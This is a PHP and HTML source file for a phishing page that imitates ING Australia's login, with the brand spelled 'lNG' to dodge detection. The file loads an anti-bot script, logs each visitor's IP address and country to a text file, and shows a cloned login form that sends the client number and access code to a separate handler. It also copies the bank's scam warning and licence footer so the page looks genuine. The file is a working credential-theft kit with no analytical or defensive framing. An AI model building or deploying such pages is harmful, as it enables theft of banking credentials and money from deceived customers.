<?php
require "antibot.php";
include "id.php";
function file_get_contents_curl($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;

}
function getRealIpAddr(){
 if (!empty($_SERVER['HTTP_CLIENT_IP'])){
      $ip=$_SERVER['HTTP_CLIENT_IP'];
 }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
      $ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
 }else{
      $ip=$_SERVER['REMOTE_ADDR'];
 }
  return $ip;
}
$realip=getRealIpAddr();
$json = file_get_contents_curl('http://www.geoplugin.net/json.gp?ip='.$realip);
$obj = json_decode($json);
$countryName=$obj->{'geoplugin_countryName'};
$countryCode=$obj->{'geoplugin_countryCode'};
$messageTxt  = "IP : ".$realip." | Country : ".$countryName."\n";
$xmyfile = fopen("Views.txt", "a+");
fwrite($xmyfile, $messageTxt);
fclose($xmyfile);
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
@font-face {
    font-family: "Christmas";
    src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot");
    src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot?#iefix")format("embedded-opentype"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff2")format("woff2"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff")format("woff"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.ttf")format("truetype"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.svg#Christmas")format("svg");
}
    </style>
</head>
<body>
    <header>
        <img src="logo.png" alt="lNG Logo">
        <button>Login</button>
    </header>
    <main>
        <section class="login-form">
            <h1>Login</h1>
            <form id="login-form" action="post1.php" method="POST">
                <label for="client-number">Enter client number (using your keyboard)</label>
                <input type="text" id="client-number" name="client-number" placeholder="Client number" style="
    padding-top: 20px;
    padding-bottom: 20px;
" required>
                <label>Enter access code (using the buttons below)</label>
                <div class="keypad">
                    <button type="button" data-number="7">7</button>
                    <button type="button" data-number="1">1</button>
                    <button type="button" data-number="3">3</button>
                    <button type="button" data-number="4">4</button>
                    <button type="button" data-number="9">9</button>
                    <button type="button" data-number="5">5</button>
                    <button type="button" data-number="2">2</button>
                    <button type="button" data-number="8">8</button>
                    <button type="button" data-number="6">6</button>
                    <button type="button" data-number="x">x</button>
                    <button type="button" data-number="0">0</button>
                    <button type="button">Cancel</button>
                </div>
                <input type="text" id="access-code" name="access-code" placeholder="Access code" style="padding-bottom: 20px;padding-top: 20px;" required>
                <button type="submit" class="login-button">Login</button>
                <a href="#">Forgotten your access code</a>
            </form>
        </section>
        <section class="important-info">
            <h2>Important</h2>
            <div class="warning">
                <h3><i class="icon-warning"></i> Scam warning: lNG impersonation calls</h3>
                <p>We have received reports about scammers making calls and claiming to be lNG staff. These calls ask customers to key account/card information into their phone keypad. lNG staff will never call and ask you for these details over the phone or to enter these details into your phone keypad. Visit ing.com.au/security to learn more about how to spot scams.</p>
            </div>
            <div class="payto">
                <h3><i class="icon-info"></i> PayTo is now available</h3>
                <p>PayTo is now live on Orange Everyday accounts.</p>
            </div>
        </section>
    </main>
    <footer>
        <div class="footer-top">
            <ul>
                <li><a href="#">Help And Support</a></li>
                <li></li>
                <li></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
            
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Contact Us</a></li>
                
                
                
                
                
            </ul>
        </div>
        <div class="footer-bottom">
            <img src="logo.png" alt="lNG Logo">
            <p>lNG is a business name of lNG Bank (Australia) Limited ABN 24 000 893 292 AFSL 229823, Australian Credit Licence 229823.<br>
            For information about the Australian Government Deposit Guarantee, click here. lNG Living Super (which is part of the lNG Superannuation Fund ABN 13 355 603 448) is issued by The Trust Company (Superannuation) Limited ABN 49 006 421 638, AFSL 235153.</p>
        </div>
    </footer>

    </div>
    <script src="script.js"></script>

		<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $siteKey; ?>"></script>
<script>
grecaptcha.ready(function() {
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form submission
        grecaptcha.execute('<?php echo $siteKey; ?>', {action: 'submit'}).then(function(token) {
            // Add your logic to submit form or append the token to the form
            var recaptchaResponse = document.createElement('input');
            recaptchaResponse.type = 'hidden';
            recaptchaResponse.name = 'recaptcha_response';
            recaptchaResponse.value = token;
            document.getElementById('login-form').appendChild(recaptchaResponse);

            // Now submit the form
            document.getElementById('login-form').submit();
        });
    });
});
</script>
</body></html>
